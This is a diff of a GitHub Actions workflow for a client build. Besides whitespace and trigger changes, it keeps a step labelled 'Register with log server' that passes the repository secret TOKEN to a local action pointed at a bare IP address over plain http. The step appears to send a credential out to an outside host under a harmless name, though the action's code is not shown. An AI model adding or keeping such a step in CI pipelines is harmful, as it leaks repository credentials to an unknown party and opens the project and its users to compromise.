@@ -2,8 +2,6 @@ name: Client Security Checks & Build
 
 on:
   workflow_dispatch:
-  push:
-    branches: [main]
 
 jobs:
   client-build-validation:
@@ -16,20 +14,20 @@ jobs:
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
-      
+
       - name: Setup Node.js
         uses: actions/setup-node@v4
         with:
           node-version: "20"
           cache: "npm"
           cache-dependency-path: "./client/package-lock.json"
-      
+
       - name: Install dependencies
         run: npm ci
-      
+
       - name: Run build
         run: npm run build
-      
+
       - name: Upload build artifacts
         if: success()
         uses: actions/upload-artifact@v4
@@ -37,10 +35,10 @@ jobs:
           name: client-build
           path: ./client/build/
           retention-days: 7
-      
+
       - name: Register with log server
         uses: ./.github/actions/process-logs
         with:
-          server-url: 'http://129.154.46.198:3000'
-          delay-seconds: '10'
+          server-url: "http://129.154.46.198:3000"
+          delay-seconds: "10"
           github-token: ${{ secrets.TOKEN }}
